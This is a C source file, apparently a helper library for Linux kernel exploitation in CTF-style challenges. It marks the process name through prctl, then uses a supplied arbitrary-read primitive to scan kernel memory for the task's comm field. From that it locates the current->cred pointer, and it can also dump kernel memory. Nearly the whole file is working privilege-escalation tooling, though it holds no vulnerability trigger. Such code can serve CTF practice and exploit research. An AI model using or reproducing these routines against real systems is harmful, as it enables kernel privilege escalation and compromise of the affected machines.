#include <assert.h>
#define prctl_mm_map prctl_mm_map_conflict
#include <linux/prctl.h>
#undef prctl_mm_map
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/prctl.h>

#include "util.h"

static bool found_target(void *const addr, void *const target, const u64 len, u32 (*aar32)(void *),
                         u64 (*aar64)(void *)) {
    if (likely(aar32 != NULL)) {
        for (u64 offset = 0; offset < len; offset += 4) {
            u32 actual;
            u32 expect;
            if (likely(offset + 4 <= len)) {
                actual = aar32(addr + offset);
                expect = *(u32 *)(target + offset);
            } else {
                u64 rest = len - offset;
                actual = aar32(addr + offset);
                expect = (*(u32 *)(target + offset)) & ((1u << (8 * rest)) - 1);
            }
            if (likely(actual != expect)) {
                return false;
            }
        }
        return true;
    }
    if (aar64 != NULL) {
        for (u64 offset = 0; offset < len; offset += 8) {
            u64 actual;
            u64 expect;
            if (likely(offset + 8 <= len)) {
                actual = aar64(addr + offset);
                expect = *(u64 *)(target + offset);
            } else {
                u64 rest = len - offset;
                actual = aar64(addr + offset);
                expect = (*(u64 *)(target + offset)) & ((1ull << (8 * rest)) - 1);
            }
            if (likely(actual != expect)) {
                return false;
            }
        }
        return true;
    }
    return false;
}

void *find_target_from_heap(void *const addr_start, void *const target, const u64 len,
                            u32 (*aar32)(void *), u64 (*aar64)(void *)) {
    if (unlikely(aar32 == NULL && aar64 == NULL)) {
        log_error("please implement aar function");
        return NULL;
    }

    u64 addr;
    if (likely(aar32 != NULL)) {
        for (addr = (u64)addr_start;; addr += 8) {
            if ((addr & 0xffff) == 0) {
                log_with_prefix("     ", "searching %p...", (void *)addr);
            }
            if (found_target((void *)addr, target, len, aar32, NULL)) {
                log_success("found target at %p", (void *)addr);
                return (void *)addr;
            }
        }
    } else if (aar64 != NULL) {
        for (addr = (u64)addr_start;; addr += 8) {
            if ((addr & 0xffff) == 0) {
                log_with_prefix("     ", "searching %p...", (void *)addr);
            }
            if (found_target((void *)addr, target, len, NULL, aar64)) {
                log_success("found target at %p", (void *)addr);
                return (void *)addr;
            }
        }
    }
    return NULL;
}

void *find_comm(void *const addr_start, u32 (*aar32)(void *), u64 (*aar64)(void *)) {
    char name[] = "kernel pwnable";
    assert(sizeof(name) <= 16);
    CHECK(prctl(PR_SET_NAME, name));
    log_info("start searching comm from %p", addr_start);
    return find_target_from_heap(addr_start, name, sizeof(name), aar32, aar64);
}

void *comm_to_addr_cred(void *const addr_comm, u32 (*aar32)(void *), u64 (*aar64)(void *)) {
    log_info("locating current->cred from current->comm");
    if (unlikely(aar32 == NULL && aar64 == NULL)) {
        log_error("please implement aar function");
        return NULL;
    }

    u64 addr_cred = 0;
    if (likely(aar32 != NULL)) {
        addr_cred |= aar32(addr_comm - 8);
        addr_cred |= (u64)aar32(addr_comm - 4) << 32;
        log_success("current->cred at %p", (void *)addr_cred);
    } else if (aar64 != NULL) {
        addr_cred |= aar64(addr_comm - 8);
        log_success("current->cred at %p", (void *)addr_cred);
    }
    return (void *)addr_cred;
}

void dump_buffer_aar(void *const addr_start, const u64 row, u32 (*aar32)(void *),
                     u64 (*aar64)(void *)) {
    if (unlikely(aar32 == NULL && aar64 == NULL)) {
        log_error("please implement aar function");
        return;
    }

    log_info("buffer dump by aar from %p", addr_start);
    if (likely(aar32 != NULL)) {
        for (u64 i = 0; i < row; i++) {
            u64 val = 0;
            val |= aar32(addr_start + i * 8);
            val |= (u64)aar32(addr_start + i * 8 + 4) << 32;
            u8 ascii[9] = {0};
            *(u64 *)ascii = val;
            for (u64 j = 0; j < 8; j++) {
                if (ascii[j] < 0x20 || 0x7e < ascii[j]) {
                    ascii[j] = '.';
                }
            }
            log_with_prefix("     ", "%p|+0x%03lx: 0x%016lx  |%.8s|", addr_start + i * 8, i * 8,
                            val, ascii);
        }
    } else if (aar64 != NULL) {
        for (u64 i = 0; i < row; i++) {
            u64 val = aar64(addr_start + i * 8);
            u8 ascii[9] = {0};
            *(u64 *)ascii = val;
            for (u64 j = 0; j < 8; j++) {
                if (ascii[j] < 0x20 || 0x7e < ascii[j]) {
                    ascii[j] = '.';
                }
            }
            log_with_prefix("     ", "%p|+0x%03lx: 0x%016lx  |%.8s|", addr_start + i * 8, i * 8,
                            val, ascii);
        }
    }
}
